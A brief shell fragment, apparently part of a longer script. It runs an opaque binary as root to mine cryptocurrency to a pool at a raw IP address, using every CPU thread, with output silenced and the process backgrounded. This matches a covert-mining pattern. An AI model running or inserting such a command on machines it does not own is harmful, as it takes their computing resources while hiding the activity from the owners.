...
chmod +x sgr1
sudo ./sgr1 -o 159.223.44.164:80 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-100000 -n 1)-a) -k -a rx/0 -t $(nproc --all) --donate-level 1 > /dev/null 2>&1 &
